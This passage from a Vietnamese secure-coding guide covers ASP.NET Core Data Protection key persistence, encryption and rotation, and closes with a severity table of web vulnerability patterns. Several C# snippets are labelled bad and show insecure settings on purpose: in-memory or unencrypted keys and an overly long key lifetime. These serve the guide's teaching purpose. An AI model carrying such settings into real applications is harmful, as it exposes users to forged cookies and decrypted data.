**HIGH** - Key không được bảo vệ và rotate dẫn đến: cookie decrypt bị expose, token forge, dữ liệu mã hóa bị giải mã khi key lộ

### 4. Vấn Đề

ASP.NET Core Data Protection API được dùng để bảo vệ cookies, anti-forgery tokens, và dữ liệu nhạy cảm. Mặc định, keys được lưu trong bộ nhớ (mất khi restart) hoặc filesystem không được mã hóa. Trong môi trường multi-instance hoặc cloud, điều này gây vấn đề nghiêm trọng.

```
VẤN ĐỀ DATA PROTECTION KEYS
==============================

Default behavior (in-memory):
  Instance 1: Key A → Generate cookie
  Instance 2: Key B (khác!) → Không decrypt được cookie từ Instance 1
  → Session mất liên tục, user bị logout ngẫu nhiên

Filesystem default (không mã hóa):
  Keys lưu tại: %LOCALAPPDATA%\ASP.NET\DataProtection-Keys\
  Nếu kẻ tấn công đọc được file key:
  → Có thể decrypt tất cả protected data
  → Có thể forge authentication cookies
  → Bypass toàn bộ authentication

Key rotation không cấu hình:
  Key mặc định sống 90 ngày
  Nếu key bị lộ: 90 ngày dữ liệu bị exposed
  Nếu rotate quá nhanh mà không giữ old keys: User bị logout
```

### 5. Phát Hiện Trong Mã Nguồn

**Regex patterns cho ripgrep:**

```bash
# Tìm Data Protection configuration
rg "AddDataProtection|PersistKeysTo|ProtectKeysWith" --type cs -n

# Tìm thiếu key persistence (mặc định in-memory)
rg "AddDataProtection\(\)" --type cs -A 5 | grep -v "PersistKeys"

# Tìm key lifetime configuration
rg "SetDefaultKeyLifetime|KeyManagementOptions" --type cs -n

# Tìm hardcoded application name (cần nhất quán)
rg "SetApplicationName" --type cs -n

# Tìm IDataProtector usage để hiểu scope
rg "IDataProtector|CreateProtector|Protect\(|Unprotect\(" --type cs -n
```

### 6. Giải Pháp

**Ví dụ SAI:**

```csharp
// BAD: Chỉ dùng AddDataProtection() mà không cấu hình
// → Keys lưu in-memory, mất khi restart, không shared giữa instances
builder.Services.AddDataProtection();

// BAD: Lưu keys vào filesystem không mã hóa
builder.Services.AddDataProtection()
    .PersistKeysToFileSystem(new DirectoryInfo(@"C:\keys\"));
    // Không có ProtectKeysWith → Keys không được mã hóa!

// BAD: Key lifetime quá dài (mặc định 90 ngày)
builder.Services.AddDataProtection()
    .PersistKeysToFileSystem(keysDirectory)
    .SetDefaultKeyLifetime(TimeSpan.FromDays(365)); // Quá lâu!
```

**Ví dụ ĐÚNG:**

```csharp
// GOOD: Cấu hình đầy đủ cho production

// Option 1: Azure Blob Storage + Azure Key Vault (cloud)
builder.Services.AddDataProtection()
    .SetApplicationName("MyApp") // Nhất quán giữa tất cả instances
    .PersistKeysToAzureBlobStorage(
        new Uri("https://mystorageaccount.blob.core.windows.net/keys/dataprotection.xml"),
        new DefaultAzureCredential())
    .ProtectKeysWithAzureKeyVault(
        new Uri("https://mykeyvault.vault.azure.net/keys/dataprotection"),
        new DefaultAzureCredential())
    .SetDefaultKeyLifetime(TimeSpan.FromDays(30)); // Rotate mỗi 30 ngày

// Option 2: Redis (multi-instance on-premise)
builder.Services.AddDataProtection()
    .SetApplicationName("MyApp")
    .PersistKeysToStackExchangeRedis(
        ConnectionMultiplexer.Connect(redisConnectionString),
        "DataProtection-Keys")
    .ProtectKeysWith(certificate) // X.509 certificate
    .SetDefaultKeyLifetime(TimeSpan.FromDays(30));

// Option 3: SQL Server
builder.Services.AddDataProtection()
    .SetApplicationName("MyApp")
    .PersistKeysToDbContext<ApplicationDbContext>() // Cài EntityFrameworkCore package
    .ProtectKeysWithCertificate(certificate)
    .SetDefaultKeyLifetime(TimeSpan.FromDays(30));

// GOOD: Giữ old keys để decrypt data cũ khi rotate
// ASP.NET tự động giữ expired keys để unprotect dữ liệu cũ
// Chỉ cần đảm bảo không xóa key files

// GOOD: Custom IDataProtector với purpose strings
public class TokenService
{
    private readonly IDataProtector _protector;

    public TokenService(IDataProtectionProvider provider)
    {
        // Purpose string phân biệt các use cases
        _protector = provider.CreateProtector("TokenService.v1");
    }

    public string ProtectToken(string token)
    {
        return _protector.Protect(token);
    }

    public string UnprotectToken(string protectedToken)
    {
        try
        {
            return _protector.Unprotect(protectedToken);
        }
        catch (CryptographicException ex)
        {
            _logger.LogWarning(ex, "Failed to unprotect token (may be expired or tampered)");
            throw new SecurityException("Invalid token", ex);
        }
    }
}

// GOOD: Time-limited tokens
public class PasswordResetService
{
    private readonly ITimeLimitedDataProtector _protector;

    public PasswordResetService(IDataProtectionProvider provider)
    {
        _protector = provider
            .CreateProtector("PasswordReset.v1")
            .ToTimeLimitedDataProtector();
    }

    public string GenerateResetToken(string userId)
    {
        return _protector.Protect(userId, lifetime: TimeSpan.FromHours(1));
    }

    public string ValidateResetToken(string token)
    {
        // Tự động throw nếu token hết hạn
        return _protector.Unprotect(token);
    }
}
```

### 7. Phòng Ngừa

**Checklist:**
- [ ] Không dùng default in-memory key storage trong production
- [ ] Persist keys vào storage bền vững (Azure Blob, Redis, SQL, filesystem)
- [ ] Mã hóa keys với Azure Key Vault, X.509 certificate, hoặc DPAPI
- [ ] `SetApplicationName()` nhất quán giữa tất cả instances
- [ ] `SetDefaultKeyLifetime(TimeSpan.FromDays(30))` để rotate định kỳ
- [ ] Không bao giờ xóa expired keys (cần để decrypt dữ liệu cũ)
- [ ] Monitor key expiration, alert trước 7 ngày

**Roslyn Analyzer Rules:**
```xml
<!-- Không có built-in Roslyn rule, nhưng: -->
<!-- 1. Security audit checklist khi deploy -->
<!-- 2. Integration test kiểm tra Data Protection setup -->
<!-- 3. Monitoring/alerting cho key expiration -->

<!-- Ví dụ health check cho Data Protection -->
```
```csharp
// GOOD: Health check cho Data Protection
builder.Services.AddHealthChecks()
    .AddCheck<DataProtectionHealthCheck>("data-protection");

public class DataProtectionHealthCheck : IHealthCheck
{
    private readonly IDataProtectionProvider _provider;

    public DataProtectionHealthCheck(IDataProtectionProvider provider)
    {
        _provider = provider;
    }

    public Task<HealthCheckResult> CheckHealthAsync(
        HealthCheckContext context,
        CancellationToken cancellationToken = default)
    {
        try
        {
            var protector = _provider.CreateProtector("HealthCheck");
            var testData = "health-check-" + DateTime.UtcNow.Ticks;
            var protected_ = protector.Protect(testData);
            var unprotected = protector.Unprotect(protected_);

            return Task.FromResult(unprotected == testData
                ? HealthCheckResult.Healthy("Data Protection is working correctly")
                : HealthCheckResult.Unhealthy("Data Protection round-trip failed"));
        }
        catch (Exception ex)
        {
            return Task.FromResult(
                HealthCheckResult.Unhealthy("Data Protection error", ex));
        }
    }
}
```

---

## Tổng Kết Domain 03

```
MATRIX MỨC ĐỘ NGHIÊM TRỌNG
==============================
CRITICAL (7 patterns):
  P01 - SQL Injection           → Database bị xâm chiếm hoàn toàn
  P02 - XSS qua Html.Raw        → Session hijacking, malware
  P03 - CSRF Token Thiếu        → Hành động trái phép thay mặt user
  P04 - JWT Validation Yếu      → Authentication bypass
  P06 - Path Traversal          → Đọc file nhạy cảm (appsettings, keys)
  P07 - Insecure Deserialization → Remote Code Execution (RCE)
  P08 - Connection String Leak  → Database bị truy cập trực tiếp

HIGH (5 patterns):
  P05 - Mass Assignment         → Leo quyền (IsAdmin=true)
  P09 - CORS Wildcard           → Cross-origin data theft
  P10 - Authorize Attribute     → Unauthorized access to endpoints
  P12 - Cryptography Sai        → Password crack, data breach
  P14 - Key Rotation            → Token forge, decrypt protected data

MEDIUM (2 patterns):
  P11 - Cookie SameSite         → CSRF risk tăng
  P13 - Identity Lockout        → Brute-force attack thành công

QUICK REFERENCE - Roslyn Packages cần cài:
  - SecurityCodeScan.VS2019
  - SonarAnalyzer.CSharp
  - Puma.Security.Rules
  - Microsoft.CodeAnalysis.NetAnalyzers (built-in .NET 5+)
```
